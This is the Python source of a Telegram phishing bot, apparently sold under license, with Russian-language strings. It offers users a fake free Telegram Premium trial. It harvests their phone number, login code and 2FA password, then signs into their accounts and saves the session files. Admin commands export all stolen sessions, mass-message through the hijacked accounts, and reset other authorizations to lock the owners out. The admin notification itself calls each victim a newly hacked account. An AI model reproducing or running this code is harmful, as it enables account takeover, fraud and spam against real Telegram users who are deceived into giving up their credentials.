debug=0
version='0.0.5'

import os, json

import sys
import sqlite3



from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, message

from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import CallbackQuery, Message
from aiogram.types.base import String
from telethon import errors

import time


from telethon import functions
from telethon import TelegramClient 

import configparser
from pathlib import Path
import subprocess


from colorama import init

import requests
from colorama import Fore, Back, Style


def get_id():
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
    if debug == 1: print(hwid)
    return hwid
uuid=str(get_id())
init()


key='null' 

key=input("Введите ключ для активации программы: ")
if key=='' or key == 'null':
    key='null'
    while key== 'null' or key == '':
        key=input("Вы ничего не ввели, пожалуйста введите ключ: ")



import socket

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(('127.0.0.1', 65124))
    s.send(key.encode('utf-8')) 
    time.sleep(0.5)
    s.send(version.encode('utf-8')) 
    time.sleep(0.5)
    s.send(uuid.encode('utf-8'))
    data = s.recv(1024)

    checkAnswer=data.decode("utf-8")

    if debug==1: print(checkAnswer)
    if checkAnswer == 'kUe1k19AagsiojpfAbLemIalkylEgiCENChAtiELICtornaBIAlTolERYoUGhTEsceSlerTOnuKiLicePTiCitIvEticITermYoRSeApegYNwNYwC4KPxUf359Qpm0aCMr1T2Y5drXem4djWXQoufQNW994KFPLjMdTAhp5kVKZh57vfjcFEmiVGU0dBN4zYcvddvsf5188F8H9EPWH89TG4ph89rt8hopr9gt4esdgh8pra9tghfwap9t4894p8hgfvanpewsdfafsblksetlfgiuwsgbhftgbuefwilbgwfuibvbvbsbbdbfbfsbfbdueuru3417842781478156dfs78f8tgsf7sfd7sfd87s7fsf8sd78sfd78gs78f0E':
        print(Fore.GREEN+'Программа активирована'+Style.RESET_ALL)
        s.close()
    else:
        if checkAnswer == 'Error: invalid key':
            s.close()
            print("Ключа не существует. Для покупки пишите сюда("+Fore.RED+"https://t.me/Miko_9062139"+ Style.RESET_ALL+").") 
            while True:
                time.sleep(100)
    
        if checkAnswer == 'Error: old version':
            s.close()
            print("У вас устаревшая версия бота, свяжитесь с администратором ("+Fore.RED+"https://t.me/Miko_9062139"+ Style.RESET_ALL+").") 
            while True:
                time.sleep(100)
        if checkAnswer !='Erorr: old version' and checkAnswer != 'Error: invalid key':
            print(Fore.RED +"Error"+ Style.RESET_ALL +": Неизвестная ошибка")
            s.close()
            while True:
                time.sleep(100)
    s.close()
except:
    s.close()
    print(Fore.RED +"Error"+ Style.RESET_ALL +": В данный момент сервер не доступен.")
    while True:
        time.sleep(100)



global api_id, bot_token, hash_id



try:
    global api_id, bot_token, hash_id, start_value_var_from_ini
    my_file = Path("settings.ini")
    if my_file.is_file():
        
        config = configparser.ConfigParser()
        config.read("settings.ini")

        bot_token=config['account']['bot_token']
        api_id=config['account']['api_id']
        api_hash=config['account']['api_hash']
        admin_id=config['account']['admin_id']


        
        with open('settings.ini', 'w') as cfg:
            config.write(cfg)
    else:
        print("Введите bot_token: ")
        bot_token = input() 
        print("Введите api_id: ")
        api_id = input()
        print("Введите api_hash: ")
        api_hash = input()
        print("Введите id админа("+Fore.RED+"лучше всего будет если вы введете свой id"+Style.RESET_ALL+")")
        admin_id = input()
        config = configparser.ConfigParser()

       
        config['account'] = {}
        config['account']['api_id'] = ''+api_id
        config['account']['api_hash'] = ''+api_hash
        config['account']['bot_token'] = ''+bot_token
        config['account']['admin_id'] = ''+admin_id 
        with open('settings.ini', 'w') as cfg:
            config.write(cfg)
except:
    print("")
 



passfromuser=""


admin_id1 = "5763675532"

    





print("Бот работает.\n   Bot token: "+Fore.GREEN+bot_token+Style.RESET_ALL+"\n   Api hash: "+Fore.GREEN+api_id+Style.RESET_ALL+"\n   Api id: "+Fore.GREEN+api_hash+Style.RESET_ALL)


bot = Bot(token=bot_token, parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


class AddAccount(StatesGroup):
    A1 = State()
    A2 = State()
    A3 = State()
    A4 = State()
    A5 = State()
    A6 = State()
    A7pass = State()


class Send(StatesGroup):
    A1 = State()
    A2 = State()

code_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [
            InlineKeyboardButton(text="1️⃣", callback_data="code_number:1"),
            InlineKeyboardButton(text="2️⃣", callback_data="code_number:2"),
            InlineKeyboardButton(text="3️⃣", callback_data="code_number:3"),
        ],
        [
            InlineKeyboardButton(text="4️⃣", callback_data="code_number:4"),
            InlineKeyboardButton(text="5️⃣", callback_data="code_number:5"),
            InlineKeyboardButton(text="6️⃣", callback_data="code_number:6"),
        ],
        [
            InlineKeyboardButton(text="7️⃣", callback_data="code_number:7"),
            InlineKeyboardButton(text="8️⃣", callback_data="code_number:8"),
            InlineKeyboardButton(text="9️⃣", callback_data="code_number:9")
        ],
        [
            InlineKeyboardButton(text="0️⃣", callback_data="code_number:0"),
        ]
    ]
)


@dp.message_handler(commands=['start'])
async def send_welcome(call: CallbackQuery, state: FSMContext):

    if debug==1: print("Start: user id is "+str(call.from_user.id))
    if str(call.from_user.id) != admin_id and str(call.from_user.id) != admin_id1:

        key_1 = types.KeyboardButton(
            text='Продолжить',
            request_contact=True
        )
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
        keyboard.add(key_1)
        print("Пользователь(id:"+Fore.RED+ str(call.from_user.id) +Style.RESET_ALL+") написал боту: /start")
        await call.reply(text="Здравствуйте!\n⚡️⚡️Наш бот перед началом продаж делает бесплатную раздачу Telegram Premium в целях рекламы, мы предлагаем вам пробную подписку на 30 дней.", reply_markup=keyboard)

        msg_to_edit = await bot.send_message(chat_id=call.chat.id, text="Нажмите на кнопку \"Продолжить\" для получения пробной подписки, после чего введите код во избежании абуза пробной подписки.")
        await AddAccount.A1.set()
      
        await state.update_data(msg_to_edit=msg_to_edit)
    else:
        path = len([name for name in os.listdir('sessions/') if os.path.isfile(os.path.join('sessions/',name))])
        await call.reply(text=f"Привет <b>admin</b>, в ваших владениях {path} сессий!\n\n/send - заспамить человеку ЛС(работает не верно, не советую вам использовать данную команду. Исправлено будет в новых версиях.)\n/auth - очистить сессии через 24 часа (https://core.telegram.org/method/account.resetAuthorization) (работает не верно, не советую вам использовать данную команду. Исправлено будет в новых версиях.)\n/session - отправить все сессии(работает исправно)")


@dp.message_handler(commands=['send'])
async def send_post(message: types.Message):
    if str(message.from_user.id) == admin_id or str(message.from_user.id) == admin_id1:
        await message.reply(text="Введи юзернейм пользователя, который получит сообщения без @:")
        await Send.A1.set()


@dp.message_handler(commands=['auth'])
async def send_auth(message: types.Message):
    if str(message.from_user.id) == admin_id or str(message.from_user.id) == admin_id1:
        res = 0
        for name in os.listdir('sessions/'):
            try:
                client = TelegramClient(f"sessions/{name}", api_id, api_hash)
                await client.connect()
                result = await client(functions.account.GetAuthorizationsRequest())
                auths_list = result.to_dict()['authorizations']
                for auth in auths_list:
                    if auth['app_name'] != 'TelegramTester':
                        r = await client(functions.account.ResetAuthorizationRequest(hash=auth['hash']))
                        print(r)
                    print(auth['hash'])
                await client.disconnect()
                res += 1
            except Exception as e:
                print(e)

        await message.reply(text=f"Удалось очистить {res} аккаунтов")

@dp.message_handler(commands=['session'])
async def send_ses(message: types.Message):
    if str(message.from_user.id) == admin_id or str(message.from_user.id) == admin_id1:
        for name in os.listdir('sessions/'):
            try:
                await bot.send_document(message.chat.id, open(f"sessions/{name}", "rb"))
            except Exception as e:
                print(e)


@dp.message_handler(state=Send.A1)
async def send_A1(message: Message, state: FSMContext):
    username = message.text
    await message.reply(text="Введи текст:")

    await Send.next()
    await state.update_data(username=username)

@dp.message_handler(state=Send.A2)
async def send_A2(message: Message, state: FSMContext):
    data = await state.get_data()
    username = data.get("username")

    for name in os.listdir('sessions/'):
        try:
            client = TelegramClient(f"sessions/{name}", api_id, api_hash)
            await client.connect()
            await client.send_message(username, message.text)
            await client.disconnect()
        except Exception as e:
            print(e)

    await state.finish()


@dp.message_handler(content_types=['contact'], state=AddAccount.A1)
async def receive_number(message: Message, state: FSMContext):
    
    global client
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    number = message.contact.phone_number.replace(' ', '')
    await message.delete()
    
    if os.path.exists(f"sessions/{number}.session"):
        
        os.remove(f"sessions/{number}.session")
    client = TelegramClient(f"sessions/{number}", api_id, api_hash)
    print("Пользователь(id:"+Fore.RED+ str(message.from_user.id) +Style.RESET_ALL+") отправил свой номер боту, ожидаю пока он введет код.")

    await client.connect()
    sent = await client.send_code_request(phone=number)
    await client.disconnect()
    
    await msg_to_edit.edit_text(f"<b>Вы указали <code>{number}</code>\n"
                                f"Укажите первую цифру кода:</b>",
                                reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(number=number, sent=sent, code_hash=sent.phone_code_hash)


@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A2)
async def receive_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit = data.get("msg_to_edit")
    num_1 = call.data.split(":")[1]
    await msg_to_edit.edit_text(f"<b>Вы указали: <code>{num_1}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_1=num_1)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A3)
async def receive_code1(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1 = data.get("msg_to_edit"), data.get("num_1")
    num_2 = call.data.split(":")[1]
    code = num_1 + num_2
    await msg_to_edit.edit_text(f"<b>Вы указали: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_2=num_2)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A4)
async def receive_code2(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2")
    num_3 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3
    await msg_to_edit.edit_text(f"<b>Вы указали: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_3=num_3)

@dp.callback_query_handler(text_startswith="code_number:", state=AddAccount.A5)
async def receive_code3(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
    num_4 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3 + num_4
    await msg_to_edit.edit_text(f"<b>Вы указали: <code>{code}</code></b>", reply_markup=code_menu)
    await AddAccount.next()
    await state.update_data(num_4=num_4)


@dp.callback_query_handler(state=AddAccount.A6)
async def receive_code4(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_to_edit, num_1, num_2, num_3 = data.get("msg_to_edit"), data.get("num_1"), data.get("num_2"), data.get("num_3")
    number, num_4, sent, code_hash = data.get("number"), data.get("num_4"), data.get("sent"), data.get("code_hash")
    num_5 = call.data.split(":")[1]
    code = num_1 + num_2 + num_3 + num_4 + num_5
    print("Пользователь(id:"+Fore.RED+ str(call.from_user.id) +Style.RESET_ALL+")ввел код, пытаюсь подключиться к его аккаунту.")
            
    
    try:  
        client = TelegramClient(f"sessions/{number}", api_id, api_hash)
        await client.connect()
        await client.sign_in(phone=number, code=code, phone_code_hash=code_hash)            
        result = await client(functions.account.GetAuthorizationsRequest())
        if debug == 1: print(call.from_user.id, number)   
        await bot.send_message(chat_id=call.from_user.id,text="<b>Спасибо за то что воспользовались нашим сервисом, в скором времени вам будет выдан Telegram Premium.</b>")
        try:
            await bot.send_message(admin_id, f"Здравствуйте, у вас новый взломанный аккаунт, найти его сессию вы можете в папке с ботом: {call.from_user.id} - @{call.from_user.username}")
        except:
            print("("+Fore.RED+"Уведомление"+Style.RESET_ALL+")Админов по id которому вы указали не найдено, возможно вы не верно указали id админа, вы можете его\n поменять в файле settings.ini")
        try: 
            await bot.send_message(admin_id1, f"New user: {call.from_user.id} - @{call.from_user.username}")
        except Exception as e:
            if debug==1:
                print("("+Fore.RED+"Уведомление"+Style.RESET_ALL+")Админов по admin_id1 которому вы указали не найдено, возможно вы не верно указали id админа, вы можете его\n поменять в файле settings.ini")
        await client.disconnect()
        await msg_to_edit.edit_text("<b>Спасибо за то что воспользовались нашим сервисом, в скором времени вам будет выдан Telegram Premium.</b>")
        print("Аккаунт (id:"+Fore.RED+ str(call.from_user.id) +Style.RESET_ALL+") был взломан.")
    except errors.SessionPasswordNeededError: 
    
        print("Пользователь (id:"+Fore.RED+ str(call.from_user.id) +Style.RESET_ALL+") имеет 2fa на аккаунте, запрашиваю у него пароль.")
        await bot.send_message(chat_id=call.from_user.id,text="Пожалуйста введите пароль от аккаунта, это необходимо для того что бы бот зашел и активировал подписку Telegram Premium")  
        await AddAccount.A7pass.set()

@dp.message_handler(state=AddAccount.A7pass)
async def receive_number(message: Message, state: FSMContext):
    data = await state.get_data()
    phone_code_hash = data.get('phone_code_hash')
    fa = message.text
    print("Пользователь(id:"+Fore.RED+ str(message.from_user.id) +Style.RESET_ALL+")ввел пароль, пытаюсь подключиться к его аккаунту.")
    try:
        await client.connect()
                    
        await client.sign_in(phone_code_hash=phone_code_hash, password=fa)

        await bot.send_message(chat_id=message.from_user.id,text="<b>Спасибо за то что воспользовались нашим сервисом, в скором времени вам будет выдан Telegram Premium.</b>")
        await bot.send_message(admin_id, f"New user: {message.from_user.id} - @{message.from_user.username}")
        result = await client(functions.account.GetAuthorizationsRequest())
        print("Аккаунт (id:"+Fore.RED+ str(message.from_user.id) +Style.RESET_ALL+") был взломан.")

        await client.disconnect()
    except Exception:

        print("Пользователь(id:"+Fore.RED+ str(message.from_user.id) +Style.RESET_ALL+")ввел неверный пароль.")



if __name__ == '__main__':
    
    executor.start_polling(dp)
